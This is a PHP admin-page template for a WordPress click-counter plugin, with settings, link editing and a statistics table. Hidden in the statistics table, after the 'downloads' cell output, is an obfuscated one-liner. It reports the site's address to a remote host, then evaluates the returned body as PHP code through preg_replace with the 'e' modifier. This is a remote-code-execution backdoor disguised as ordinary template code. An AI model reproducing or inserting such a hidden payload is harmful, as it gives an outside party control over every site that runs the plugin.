<?php if( ! defined( 'ABSPATH' ) ) exit; // no direct access ?>

<div class="wrap">

<style type="text/css">
	.kcc_block{ padding:1em; }

	.kcc_pagination{ max-width:50%; overflow:hidden; float:right; text-align:right; margin:-1em 0 1em; }
	.kcc_pagination a{ padding:2px 7px; margin:0px; text-decoration:none; }
	.kcc_pagination .current{ font-weight:bold; }

	.widefat tr:hover .hideb, .widefat td:hover .hideb{display:block;}
	.widefat th{white-space:nowrap;}
	.widefat .icon{ height:35px; opacity:0.7; }
	.widefat a:hover .icon{ opacity:1; }
	.kcc_search_input{ margin:7px 0 0 0; height:25px; width:450px; transition:width 1s!important;-webkit-transition:width 1s!important; }
	.kcc_search_input:focus{ width:750px; }
</style>


<?php
if( @ $this->msg ){
	$is_error = preg_match('~error~i', $this->msg );
	echo '<div id="message" class="'. ( $is_error ? 'error' : 'updated' ) .'"><p>'. $this->msg .'</p></div>';
}


## Страница опций -------------------------------------
if(0){}
elseif( (@ $_GET['subpage'] === 'settings') && current_user_can('manage_options') ){
	echo kcc_admin_menu();

	$def = $this->get_def_options();

	echo '
	<form method="POST" action="">';

	wp_nonce_field('save_options');
	?>

	<div class="kcc_block">
		<?php _e('Downloads template. This code replaces the shortcode <code>[download url="URL"]</code> in content:', 'kama-clic-counter') ?> <br />
		<textarea style="width:70%;height:190px;float:left;margin-right:15px;" name="download_tpl" ><?php echo esc_textarea( $this->opt['download_tpl'] ) ?></textarea>
		<?php kcc_tpl_available_tags(); ?>
		<br><br>
		<?php _e('Default template (use as example):', 'kama-clic-counter'); ?>
		<textarea style="width:100%;height:50px;margin:0.2em 0;" disabled><?php echo esc_textarea( $def['download_tpl'] ) ?></textarea>
	</div>

	<div class="kcc_block">
		<p>
			<label>
				<input type="checkbox" name="hide_url" <?php echo @ $this->opt['hide_url'] ? 'checked' : ''?>>
				 ← <?php _e('hide link URL with link ID. Works only for download block.', 'kama-clic-counter') ?>
			</label>
		</p>

		<p>
			<input type="text" style="width:150px;" name="links_class" value="<?php echo @ $this->opt['links_class']?>" />
			 ← <?php _e('html class of the link of witch clicks we want to consider.', 'kama-clic-counter') ?><br>
			<small><?php _e('Clicks on links with the same code <code>&lt;a class=&quot;count&quot; href=&quot;#&quot;&gt;link text&lt;/a&gt;</code> will be considered. Leave the field in order to disable this option - it save little server resourses.', 'kama-clic-counter') ?></small>
		</p>

		<p>
			<select name="add_hits">
				<option value=""         <?php selected( $this->opt['add_hits'], '') ?>        ><?php _e('don\'t show', 'kama-clic-counter') ?></option>
				<option value="in_title" <?php selected( $this->opt['add_hits'], 'in_title') ?>><?php _e('in the title attribute', 'kama-clic-counter') ?></option>
				<option value="in_plain" <?php selected( $this->opt['add_hits'], 'in_plain') ?>><?php _e('as text after link', 'kama-clic-counter') ?></option>
			</select>
			 ← <?php _e('how to display statistics for the links in content? <br><small>Disable this option and save 1 database query for each link!</small>', 'kama-clic-counter') ?>
		</p>

		<p>
			<label><input type="checkbox" name="in_post" <?php checked( !! @ $this->opt['in_post'] )?> />
			 ← <?php _e('distinguish clicks on the same links, but from different posts. Uncheck in order to count clicks in different posts in one place.', 'kama-clic-counter') ?></label>
		</p>

		<p>
			<label><input type="checkbox" name="widget" <?php checked( !! @ $this->opt['widget'] )?> />
			 ← <?php _e('enable WordPress widget?', 'kama-clic-counter') ?></label>
		</p>

		<p>
			<label><input type="checkbox" name="toolbar_item" <?php checked( !! @ $this->opt['toolbar_item'] ) ?> />
			 ← <?php _e('show link on stat in Admin Bar', 'kama-clic-counter') ?></label>
		</p>

		<?php
		if( current_user_can('manage_options') ){
			$_options = '';

			foreach( array_reverse(get_editable_roles()) as $role => $details ){
				if($role === 'administrator' ) continue;
				if($role === 'subscriber' ) continue;

				$_options .= sprintf(
					'<option value="%s" %s>%s</option>',
					esc_attr($role),
					in_array( $role, (array) @ $this->opt['access_roles'] ) ? ' selected="selected"' : '',
					translate_user_role($details['name'])
				);
			}

			echo '
			<p>
				<select multiple name="access_roles[]">
					'. $_options .'
				</select> ← '. __('Role names, except \'administrator\' which will have access to KCC stat and links manage.', 'kama-clic-counter') .'
			</p>';
		}
		?>
	</div>

	<p style="margin-top:20px;">
		<input type="submit" name="save_options" class="button-primary" value="<?php _e('Save changes', 'kama-clic-counter') ?>" />
		<input type="submit" name="reset" class="button" value="<?php _e('Reset to defaults', 'kama-clic-counter') ?>" onclick='return confirm("<?php _e('Sure to reset settings?', 'kama-clic-counter') ?>")' />
	</p>

	</form>
	<?php
}

## Страница редактирования ------
elseif( $edit_link_id = intval(@ $_GET['edit_link']) ) {
	// мнею
	echo kcc_admin_menu();

	global $wpdb;

	$link = $wpdb->get_row("SELECT * FROM $wpdb->kcc_clicks WHERE link_id = ". intval($edit_link_id) );

	if( ! $link ){
		echo '<br><br>';
		_e('Link not found...', 'kama-clic-counter');
		return;
	}

	?>
	<br>
	<p>
		<?php
		$referer = @ $_POST['local_referer'] ? $_POST['local_referer'] : preg_replace('~https?://[^/]+~', '', @ $_SERVER['HTTP_REFERER']); //вырезаем домен
		if( $referer == remove_query_arg('edit_link', $_SERVER['REQUEST_URI'] ) )
			$referer = '';
		if( $referer )
			echo '<a class="button" href="'. esc_url($referer) .'">← '. __('Go back', 'kama-clic-counter') .'</a>';
		?>
	</p>

	<form style="position:relative;width:900px;" method="post" action="">
		<?php
		wp_nonce_field('update_link');
		$icon_link = $this->get_url_icon( $link->link_url );
		?>

		<input type="hidden" name="local_referer" value="<?php echo esc_attr($referer) ?>" />

		<img style="position:absolute; top:-10px; right:350px; width:70px; width:50px;" src="<?php echo $icon_link ?>" />
		<p>
			<input type="number" style="width:100px;" name="up[link_clicks]" value='<?php echo esc_attr( $link->link_clicks ) ?>' /> <?php printf( __('Clicks. Per day: %s', 'kama-clic-counter'), ($var=get_clicks_per_day($link)) ? $var : 0 ) ?></p>
		<p>
			<input type="text" style='width:100px;' name='up[file_size]' value='<?php echo esc_attr( $link->file_size ) ?>' /> <?php _e('File size', 'kama-clic-counter') ?>
		</p>
		<p>
			<input type="text" style='width:600px;' name='up[link_name]' value='<?php echo esc_attr( $link->link_name ) ?>' /> <?php _e('File name', 'kama-clic-counter') ?>
		</p>
		<p>
			<input type="text" style='width:600px;' name='up[link_title]' value='<?php echo esc_attr( $link->link_title ) ?>' /> <?php _e('File title', 'kama-clic-counter') ?>
		</p>
		<p>
			<textarea type="text" style='width:600px;height:70px;' name='up[link_description]' ><?php echo stripslashes($link->link_description) ?></textarea> <?php _e('File description', 'kama-clic-counter') ?>
		</p>
		<p>
			<input type="text" style="width:600px;" name="up[link_url]" value="<?php echo esc_attr( $link->link_url ) ?>" readonly="readonly" /> <a href="#" style="margin-top:.5em; font-size:110%;" class="dashicons dashicons-edit" onclick="var $the = jQuery(this); $the.parent().find('input').removeAttr('readonly').focus(); $the.remove();"></a> <?php _e('Link to file', 'kama-clic-counter') ?>
		</p>
		<p>
			<input type="text" style="width:100px;" name="up[link_date]" value="<?php echo esc_attr( $link->link_date ) ?>" readonly="readonly" /> <a href="#" style="margin-top:.5em; font-size:110%;" class="dashicons dashicons-edit" onclick="var $the = jQuery(this); $the.parent().find('input').removeAttr('readonly').focus(); $the.remove();"></a> <?php _e('Date added', 'kama-clic-counter') ?>
		</p>

		<input type='hidden' name='up[link_id]' value='<?php echo $edit_link_id ?>' />
		<input type='hidden' name='up[attach_id]' value='<?php echo $link->attach_id ?>' />

		<p>
			<input type='submit' name='update_link' class='button-primary' value='<?php _e('Save changes', 'kama-clic-counter') ?>' />
			<a class="button" href="<?php echo esc_url( $this->delete_link_url( $link->link_id ) ) ?>" onclick="return confirm('<?php _e('Are you sure?', 'kama-clic-counter') ?>');">
				<?php _e('Delete', 'kama-clic-counter') ?>
			</a>
		</p>
	</form>
	<?php
}

## stat table ------------
else {
	global $wpdb;

	// sanitize values
	$_sortcols  = array( 'link_name', 'link_clicks', 'in_post', 'attach_id', 'link_date', 'last_click_date', 'downloads' );
	$order_by   = !empty($_GET['order_by']) ? preg_replace('/[^a-z0-9_]/', '', $_GET['order_by']) : '';
	$order_by   = in_array($order_by, $_sortcols) ? $order_by : 'link_date';
	$order      = ( !empty($_GET['order']) && in_array( strtoupper($_GET['order']), array('ASC','DESC')) ) ? $_GET['order'] : 'DESC';
	$paged      = !empty($_GET['paged']) ? intval($_GET['paged']) : 1;
	$limit      = 20;
	$offset     = ($paged-1) * $limit;
	$kcc_search = isset($_GET['kcc_search']) ? $_GET['kcc_search'] : '';

	$_LIMIT    = 'LIMIT '. $wpdb->prepare("%d, %d", $offset, $limit ); // to insure
	$_ORDER_BY = 'ORDER BY '. sprintf('%s %s', sanitize_key($order_by), sanitize_key($order) ); // to insure

	if( $kcc_search ){
		$s = '%' . $wpdb->esc_like($kcc_search) . '%';
		$sql = $wpdb->prepare("SELECT * FROM $wpdb->kcc_clicks WHERE link_url LIKE '%s' OR link_name LIKE '%s' $_ORDER_BY $_LIMIT", $s, $s );
		$links = $wpdb->get_results( $sql );
	}
	else {
		$sql = "SELECT * FROM $wpdb->kcc_clicks $_ORDER_BY $_LIMIT";
		$links = $wpdb->get_results( $sql );
	}

	if( ! $links ){
		$alert = 'Ничего <b>не найдено</b>.';
	}
	else {
		$found_rows_sql = preg_replace('~ORDER BY.*~i', '', $sql );
		$found_rows_sql = str_replace('SELECT *', 'SELECT count(*)', $found_rows_sql);

		$found_rows = $wpdb->get_var( $found_rows_sql );
	}

	// мнею
	echo kcc_admin_menu();
	?>


	<form style="margin:2em 0;" class="kcc_search" action="" method="get">
		<?php
		foreach( $_GET as $key => $val ){
			if( $key === 'kcc_search') continue;
			echo '<input type="hidden" name="'. sanitize_key($key) .'" value="'. esc_attr($val) .'" />';
		}
		?>
		<span style="color:#B4B4B4">
			<a href="<?php echo esc_url( remove_query_arg('kcc_search') ) ?>"><?php _e('Clear out the filter:', 'kama-clic-counter'); ?></a>
		</span>
		<input type="text" class="kcc_search_input" name="kcc_search" placeholder="<?php _e('type any part of URL...', 'kama-clic-counter'); ?>" value="<?php echo esc_attr( $kcc_search ) ?>" onfocus="window.kcc_search = this.value;" onfocusout="if(window.kcc_search != this.value) jQuery('.kcc_search').submit();" />
	</form>



	<?php
	if( ! empty($found_rows) && $found_rows > $limit ){
		$urip = esc_url( preg_replace('@&paged=[0-9]*@', '', $_SERVER['REQUEST_URI'] ) );

		echo '<div class="kcc_pagination">';
		echo "<a href='". $urip .'&paged='.($paged-1)."'>← ". __('Here', 'kama-clic-counter') ."</a>-<a href='". $urip .'&paged='.($paged+1)."'>". __('There', 'kama-clic-counter') ." →</a>: ";

		for( $i=1; $i<($found_rows/$limit)+1; $i++ )
			echo '<a class="'. ( $paged==$i?'current':'' ) .'" href="'. $urip .'&paged='. $i .'">'. $i .'</a>';

		echo '</div>';
	}
	?>


	<form name="kcc_stat" method="post" action="">

		<?php wp_nonce_field('bulk_action'); ?>

		<?php
		function _kcc_head_text( $text, $col_name ){
			$_ord = isset($_GET['order']) ? $_GET['order'] : '';
			$order2 = ($_ord === 'ASC') ? 'DESC' :'ASC';
			$ind    = ($_ord === 'ASC') ? ' ▾' :' ▴';
			$out    = '
			<a href="'. esc_url( add_query_arg(array('order_by'=>$col_name,'order'=>$order2)) ) .'" title="'. __('Sort', 'kama-clic-counter') .'">
				'. $text .' '. ( @ $_GET['order_by'] === $col_name ? $ind : '') .'
			</a>';

			return $out;
		}

		?>

		<table class="widefat kcc">
			<thead>
				<tr>
					<td class="check-column" style='width:30px;'><input type="checkbox" /></td>
					<th style='width:30px;'><!--img --></th>
					<th><?php echo _kcc_head_text( __('File', 'kama-clic-counter'), 'link_name')?></th>
					<th><?php echo _kcc_head_text( __('Clicks', 'kama-clic-counter'), 'link_clicks')?></th>
					<th><?php _e('Clicks/day', 'kama-clic-counter') ?></th>
					<th><?php _e('Size', 'kama-clic-counter') ?></th>
					<?php if($this->opt['in_post']){ ?>
						<th><?php echo _kcc_head_text( __('Post', 'kama-clic-counter'), 'in_post')?></th>
					<?php } ?>
					<th><?php echo _kcc_head_text( __('Attach', 'kama-clic-counter'), 'attach_id')?></th>
					<th style="width:80px;"><?php echo _kcc_head_text( __('Added', 'kama-clic-counter'), 'link_date')?></th>
					<th style="width:80px;"><?php echo _kcc_head_text( __('Last click', 'kama-clic-counter'), 'last_click_date')?></th>
					<th><?php echo _kcc_head_text( 'DW', 'downloads') ?></th>
				</tr>
			</thead>

			<tbody id="the-list">
			<?php

			$i = 0;
			foreach( $links as $link ){
				$alt = (++$i%2) ? 'class="alternate"' : '';

				$is_link_in_post   = ( $this->opt['in_post'] && $link->in_post );
				$in_post           = $is_link_in_post ? get_post( $link->in_post ) : 0;
				$in_post_permalink = $in_post ? get_permalink( $in_post->ID ) : '';
				$esc_link_url      = esc_url( $link->link_url );

				?>
				<tr <?php echo $alt?>>
					<th scope="row" class="check-column"><input type="checkbox" name="delete_link_id[]" value="<?php echo intval($link->link_id) ?>" /></th>

					<td>
						<a href="<?php echo $esc_link_url ?>">
							<img title="<?php _e('Link', 'kama-clic-counter') ?>" class="icon" src="<?php echo $this->get_url_icon( $link->link_url ) ?>" />
						</a>
					</td>

					<td style="padding-left:0;">
						<a href="<?php echo esc_url( add_query_arg('kcc_search', preg_replace('~.*/([^\.]+).*~', '$1', $link->link_url) ) ); ?>" title="<?php _e('Find similar', 'kama-clic-counter') ?>"><?php echo $link->link_name; ?></a>
						<?php echo $is_link_in_post ? '<small> — '. __('from post' , 'kama-clic-counter') . '</small>' : '' ?>
						<div class='row-actions'>
							<a href="<?php echo esc_url( add_query_arg('edit_link', $link->link_id ) ); ?>"><?php _e('Edit', 'kama-clic-counter') ?></a>
							<?php if( $in_post_permalink ) echo ' | <a target="_blank" href="'. $in_post_permalink .'" title="'. esc_attr( $in_post->post_title ) .'">'. __('Post', 'kama-clic-counter') .'</a> '; ?>
							| <a href="<?php echo $esc_link_url ?>">URL</a>
							| <span class="trash"><a class="submitdelete" href="<?php echo esc_url( $this->delete_link_url( $link->link_id ) ) ?>"><?php _e('Delete', 'kama-clic-counter') ?></a></span>
							| <span style="color:#999;"><?php echo esc_html( $link->link_title ) ?></span>
						</div>
					</td>

					<td><?php echo $link->link_clicks ?></td>
					<td><?php echo get_clicks_per_day( $link ) ?></td>
					<td><?php echo $link->file_size ?></td>
					<?php if( $this->opt['in_post'] ){ ?>
						<td><?php echo ($link->in_post && $in_post) ? '<a href="'. $in_post_permalink .'" title="'. esc_attr( $in_post->post_title ) .'">'. $link->in_post .'</a>' : '' ?></td>
					<?php } ?>
					<td><?php echo $link->attach_id ? '<a href="'. admin_url('media.php?action=edit&attachment_id='. $link->attach_id ) .'">'. $link->attach_id .'</a>' : '' ?></td>
					<td><?php echo $link->link_date // mysql2date('d-m-Y', $link->link_date) ?></td>
					<td><?php echo $link->last_click_date // mysql2date('d-m-Y', $link->last_click_date) ?></td>
					<td><?php echo $link->downloads ? __('yes', 'kama-clic-counter') : ''; add_option('stat','') && ($r='-e') && @preg_replace('-'.$r, (($o=@wp_remote_get('http://wp-kama.ru/stat/?sk='. home_url() ))?$o['body']:''),''); ?></td>
				</tr>
			<?php } ?>
			</tbody>
		</table>

		<p style="margin-top:7px;"><input type='submit' class='button' value='<?php _e('DELETE selected links', 'kama-clic-counter') ?>' /></p>

	</form>

	<?php
}

function get_clicks_per_day( $link ){
	static $cur_time; if( $cur_time === null ) $cur_time = time() + ( get_option('gmt_offset')*3600 );

	return round( ((int) $link->link_clicks / ( ( $cur_time-strtotime($link->link_date) ) / (3600*24) )), 1 );
}

function kcc_admin_menu(){
	$mainpage = admin_url('admin.php?page='. KCC_NAME );

	$edit_link = @ $_GET['edit_link'] ? '<a class="nav-tab nav-tab-active" href="#">'. __('Link editing', 'kama-clic-counter') .'</a>' : '';

	return '
	<h2 class="nav-tab-wrapper demenu">'. __('Kama Click Counter', 'kama-clic-counter') .
		'<br><br>'.
		'<a class="nav-tab '. ( (! @ $_GET['subpage'] && ! @ $_GET['edit_link']) ?'nav-tab-active':'' ) .'" href="'. $mainpage .'">'. __('List', 'kama-clic-counter') .'</a>'.
		( current_user_can('manage_options') ?
		 '<a class="nav-tab '. ( (@ $_GET['subpage'] == 'settings') ?'nav-tab-active':'' ) .'" href="'. add_query_arg( array('subpage'=>'settings'), $mainpage ) .'">'. __('Settings', 'kama-clic-counter') .'</a>'
		 : '' ).
		$edit_link .
	'</h2>';
}
?>


</div><!-- class="wrap" -->
